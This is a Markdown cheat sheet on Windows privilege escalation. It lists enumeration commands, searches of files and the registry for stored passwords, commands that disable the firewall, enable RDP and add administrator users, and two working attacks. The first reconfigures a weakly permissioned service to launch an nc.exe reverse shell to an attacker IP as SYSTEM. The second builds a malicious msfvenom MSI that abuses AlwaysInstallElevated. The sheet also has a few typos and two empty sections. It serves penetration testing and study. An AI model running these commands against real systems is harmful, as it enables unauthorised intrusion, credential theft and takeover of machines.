# Windows Privilege Escalation

## Enumeration
### System
```cmd
# Get system info about computer and OS
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo /s test-server
systeminfo /s test-server /u testdomain\<username>
hostname 

# systeminfo output save in a file, check for vulnerabilities
https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt 

#OS Check Patches and disk information
wmic logicaldisk
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic product get name, version,  vendor
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

# Display environment variables
set
echo %Path%

# List windows services
net start
sc queryex type=service 'lists all services'
wmic service list brief
tasklist /SVC

# Display list of currently running processes
tasklist 
tasklist /s <server>
tasklist /s <server> /u testdomain\<username> /p <password>

# Kill a process 
taskkill /PID 1234 /F

# See what drives are mounted to your file system
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
wmic logicaldisk get deviceid, volumename, description
wmic logicaldisk get name
mountvol

# Check for current drivers
driverquery

# Find filepath to executable (Like which on linux)
where cmd 
```

### Network & Domain
```cmd
# Show network information
ipconfig
ipconfig /all
arp -a 
netstat -an
netstat -r
netstat -rn
router print

# Retrieve local DNS information
ipconfig /displaydns 
nslookup 

# List network shares
net share

# List ports and connections with the system
netstat -nabo
netstat -aton

# Find information about a specific service
netstat -nabo | findstr /I <service|process|port>

# Find all listening ports on port 80
netstat -na | findstr :80

# Finf all listening ports and their associated PIDs
netstat -nao | findstr /I listening

# Display a target PCs listening services
nbtstat -A <targetIP>

# Display information about all connections to the computer (have to be an admin shell)
net session

# Display host name from IP
nvtstat -a <IP>

# Get domain controllers
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName

# Retrieve information about Domain and Domain controller
wmic ntdomain list
echo %logonserver%

# Check if you are part of domain
net localgroup /domain

# List detailed information about the current domain user account
net user %USERNAME% /domain

# Prints members of the domain admins
net group <groupname> /domain

# Print password policy for the domain
net accounts /domain
netaccounts /domain:DOMAINNAME
```

### Firewall/AV/Services
```cmd
# Show firewall running or stopped
netsh firewall show state

# Show firewall configuration
netsh firewall show conf
netsh firewall show state

# Disable Firewall
netsh firewall set opmode disable
netsh firewall set opmode=disable profile=all
netsh advfirewall set all profiles state off 

# Query Windows Defender
sc query windefend

# Antivirus
netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

# enable RDP
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```

### Users
```cmd
# Current User information
whoami
echo %USERNAME% || whoami
whoami /priv
whoami /groups
net user %USERNAME%

# Lost local users
net user

# Other users information
net user <username> 'Checks groups associated with user'
net localgroup 'Lists all local groups availible'
net localgroup <groupname>  'Lists members of given group'

# Print password policy for the local system
net accounts

# List other logged in users
qwinsta 

# Add user to non-admin
net user /add username
net user /add <username> <password>

# Add user to admin group
net localgroup administrators /add <username>

```

### File System
```cmd

```
### Working With Files and Folders
```cmd

```
## Password Hunting
For files where passwords might be, look out for the files being base64 encoded.
### General Search
```cmd
# General Search 
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```
### Potential File Locations
*Note: For files where passwords might be, look out for the files being base64 encoded.*

```cmd
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*
dir /b /s vnc.ini
```

### In Registry
```cmd
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Access Control
### Weak Services
```cmd
wmic service list brief
```

### AlwaysInstalledElevated
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

### Insecure Service Permissions
```cmd
# check for serices with weak permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# check for the found services above
accesschk.exe -ucqv upnphost

# upload nc.exe to writable directory
sc config upnphost binpath= "C:\Inetpub\nc.exe -nv <attackerip> 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""

# check the status now
sc qc upnphost

# change start option as AUTO-START 
sc config SSDPSRV start= auto

#start the services
net start SSDPSRV
net stop upnphost
net start upnphost

# listen on port 9988 and you'll get a shell with NT AUTHORITY\SYSTEM privilege
```

## Exploiting
```cmd
# Exploiting AlwaysInstalledElevated
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi
Place 'setup.msi' in 'C:\Temp'
msiexec /quiet /qn /i C:\Temp\setup.msi
net localgroup Administrators
```
